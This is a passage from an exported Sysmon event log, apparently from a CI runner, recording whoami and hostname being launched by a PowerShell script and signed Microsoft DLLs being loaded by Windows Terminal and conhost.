Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:08 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:08.015
ProcessGuid: {f995aebf-6218-6942-b303-000000000e00}
ProcessId: 5256
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:04 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:04.664
ProcessGuid: {f995aebf-6214-6942-b203-000000000e00}
ProcessId: 8416
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:04 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:04.516
ProcessGuid: {f995aebf-6214-6942-b003-000000000e00}
ProcessId: 6504
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
